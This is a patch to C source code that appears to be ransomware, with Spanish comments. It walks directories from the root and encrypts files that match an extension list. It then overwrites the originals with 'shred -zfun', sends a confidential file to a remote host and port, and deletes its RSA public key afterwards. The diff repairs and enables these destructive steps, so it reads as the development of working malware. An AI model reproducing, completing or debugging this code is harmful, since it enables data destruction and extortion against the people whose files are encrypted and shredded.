@@ -170,13 +170,21 @@ void key_pub(int i){
         "-----END PUBLIC KEY-----"
     };
     if(i == 1){
-        int fd = open("clave.pub.pem", O_CREAT| O_WRONLY, 0444);
+        int fd = open("clave.pub.pem", O_CREAT| O_WRONLY, 0600);
         write(fd, pub_key, strlen(pub_key));
         close(fd);
         fsync(fd);
     } else if(i == 0){
-        char * myargs[] = {"rm", "clave.pub.pem", (char *)NULL};
-        execv("/bin/rm", myargs);
+        char * myargs[] = {"rm", "-f","clave.pub.pem", (char *)NULL};
+        
+        int fc = fork();
+
+        if (fc == 0) {
+            execv("/bin/rm", myargs);
+        } else if (fc < 0) {
+            perror("Error on forking");
+            exit(9);
+        }
     }
 }
 //--------------------------------------------
@@ -210,7 +218,7 @@ void cifrar(char path[], char file[], char passwd[]) {
   strcat(command,path);
   strcat(command,"/");
   strcat(command,file);
-  strcat(command,".ntd 2>/dev/null; /usr/bin -zfun 1 ");
+  strcat(command,".ntd 2>/dev/null; /usr/bin/shred -zfun 1 ");
   strcat(command,path);
   strcat(command,"/");
   strcat(command,file);
@@ -223,7 +231,7 @@ void cifrar(char path[], char file[], char passwd[]) {
 
 int find_ext(char file[]){
     for(int i=0; i<ext_len; i++){
-        if(strstr(file,extension[i]) != NULL){ // que no tenga .ntd (revisar doc strstr)
+        if(strstr(file,extension[i]) != NULL && strstr(file,".ntd") == NULL){ // que no tenga .ntd (revisar doc strstr)
             return 1;
         }
     }
@@ -245,9 +253,13 @@ int list_files(int n, int h, char key[])
         {
             if(strcmp(dir->d_name, ".") && strcmp(dir->d_name, "..")){
                 if(dir->d_type == DT_DIR){
-                    strcat(path,"/");
-                    strcat(path, dir->d_name);
-                    list_files(strlen(path), h+1, key);
+                    if(h==0 && (!strcmp(dir->d_name,"boot") || !strcmp(dir->d_name,"etc") || !strcmp(dir->d_name,"proc"))){
+                        printf("este dic %s no lo toco\n",dir->d_name);
+                    }else{
+                        strcat(path,"/");
+                        strcat(path, dir->d_name);
+                        list_files(strlen(path), h+1, key);
+                    }
                     path[n] = 0;
                 }else if(dir->d_type == DT_REG){
                     if(find_ext(dir->d_name)){
@@ -286,7 +298,7 @@ void main(int argc, char * argv[]){
     //Enviando fichero confidencial
     send_file("enviame.enc",argv[1],argv[2]);
     //Del RSA Pub
-    //key_pub(0);
+    key_pub(0);
     //Listar ficheros y cifrar
     list_files(strlen(path),0,key);
 }
